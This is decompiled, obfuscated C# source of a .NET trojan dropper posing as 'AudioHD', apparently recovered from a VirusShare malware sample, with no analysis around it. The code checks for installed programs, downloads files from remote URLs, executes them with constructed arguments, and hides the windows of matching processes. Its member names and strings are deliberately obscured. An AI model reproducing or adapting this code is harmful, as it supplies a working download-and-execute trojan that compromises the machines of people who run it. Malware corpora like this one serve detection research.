﻿// Decompiled with JetBrains decompiler
// Type: .
// Assembly: AudioHD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A79492AA-5FAA-4ED2-ACC6-3D90AD665D99
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-Dropper.Win32.Sysn.awyx-36fae8d04bf5f7d873dd5aa10ad92403f80b9af8b6ef91319e70ea2c9c043024.exe

using \u0001;
using \u0008;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0008
{
  internal sealed class \u0002
  {
    [NonSerialized]
    internal static \u0002 \u0001;
    public static bool \u0001;
    public static bool \u0002;
    public static bool \u0003;
    public static string \u0001;
    public static string \u0002;
    public static string \u0003;
    public static string \u0004;
    public static string \u0005;
    public static string \u0006;

    [DllImport("user32.dll", EntryPoint = "ShowWindow")]
    private static extern int \u000F([In] int obj0, [In] int obj1);

    internal static void \u000F([In] string obj0, [In] string obj1)
    {
      if (\u0002.\u000F())
      {
        \u0002.\u0010(obj0, obj1);
        \u0002.\u0001 = true;
        \u0002.\u0010(\u0002.\u0001(2144));
      }
      else if (!\u0002.\u0010())
      {
        if (!\u0002.\u0011())
          return;
        \u0002.\u000F(obj0);
        \u0002.\u0003 = true;
        \u0002.\u0010(\u0002.\u0001(2174));
      }
      else
      {
        \u0002.\u0011(obj0, obj1);
        \u0002.\u0002 = true;
        \u0002.\u0010(\u0002.\u0001(2157));
      }
    }

    internal static bool \u000F() => System.IO.File.Exists(\u0002.\u0001);

    internal static bool \u0010() => System.IO.File.Exists(\u0002.\u0003);

    internal static bool \u0011() => System.IO.File.Exists(\u0002.\u0002);

    private static void \u0010([In] string obj0, [In] string obj1)
    {
      new WebClient().DownloadFile(obj0, obj1);
      Process.Start(new ProcessStartInfo()
      {
        FileName = \u0002.\u0001,
        Arguments = \u0002.\u0001(2187) + Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + \u0002.\u0001(2204) + obj1
      });
      Thread.Sleep(1000);
    }

    private static void \u000F([In] string obj0)
    {
      Process.Start(new ProcessStartInfo()
      {
        FileName = \u0002.\u0002,
        Arguments = obj0
      });
      Thread.Sleep(1000);
    }

    private static void \u0011([In] string obj0, [In] string obj1)
    {
      new WebClient().DownloadFile(obj0, obj1);
      Process.Start(new ProcessStartInfo()
      {
        FileName = \u0002.\u0001,
        Arguments = \u0002.\u0001(2187) + Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + \u0002.\u0001(2204) + obj1
      });
      Thread.Sleep(1000);
    }

    private static void \u0010([In] string obj0)
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (process.ProcessName.Contains(obj0))
        {
          try
          {
            \u0002.\u000F(process.MainWindowHandle.ToInt32(), 0);
          }
          catch
          {
          }
        }
      }
    }

    static \u0002()
    {
      \u0003.\u000F();
      \u0002.\u0001 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + \u0002.\u0001(2209);
      \u0002.\u0002 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + \u0002.\u0001(2242);
      \u0002.\u0003 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + \u0002.\u0001(2267);
      \u0002.\u0004 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0002.\u0001(2304);
      \u0002.\u0005 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0002.\u0001(2321);
      \u0002.\u0006 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0002.\u0001(2338);
    }
  }
}